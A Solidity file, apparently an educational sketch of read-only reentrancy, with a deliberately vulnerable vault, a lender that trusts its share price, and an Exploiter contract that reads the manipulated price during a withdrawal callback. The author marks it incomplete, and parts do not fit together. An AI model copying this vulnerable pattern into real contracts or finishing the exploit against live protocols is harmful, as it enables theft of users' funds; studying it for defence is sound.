// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract VulnerableVault {
    IERC20 public token;
    mapping(address => uint256) public balances;
    uint256 public totalShares;
    //im not writing a full vault contract for ts

    function withdraw(uint256 shares) public {
        uint amount = (shares * token.balanceOf(address(this))) / totalShares;
        _burn(msg.sender, shares);
        token.transfer(msg.sender, amount);
    }

    function getSharePrice() external view returns (uint256) {
        //during the attack this is vulnerable as totalShares has been lowered but the assets are
        //still high as the transfer hasnt finished 
        return token.balanceOf(address(this)) * 1e18 / totalShares;
    }

    function _burn(address account,uint amount) internal {
        require(account != address(0), "Burn from zero address");
        require(balances[account] >= amount, "Burn amount exceeds balance");
        balances[account] -= amount;
        totalShares -= amount;
    }
}

contract Lender {
    VulnerableVault vault;
    function basicBorrow(uint256 collateralShares) external {
        uint price = vault.getSharePrice();

        //a lot of checks have not been wrote as this is just an example for read only reentrancy
        uint256 maxBorrow = collateralShares * price * 80 / 100; //80% LTV 
        
        // usdc.transfer(msg.sender, maxBorrow);  - commented because i have not implemented usdc
    }
}

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 shares) external;
    function getSharePrice() external view returns (uint256);
}

contract Exploiter {
    IVulnerableVault vault;
    Lender lender;
    bool flag = false;
    constructor(address _vault, address _lender) {
        vault = IVulnerableVault(_vault);
        lender = Lender(_lender);
    }

    function attack() external payable {
        //deposit to get shares
        vault.deposit{value: 10 ether}();
        //withdraw to trigger our receive
        vault.withdraw(10 ether);
    }

    receive() external payable {
        if (flag == false) {
            flag = true;
            
            uint256 price = vault.getSharePrice();
            //the price is huge so we can lend more than we shouldve
            
            //lender.borrow(10000 usdc); - commented because i have not implemented usdc
        }
    }
}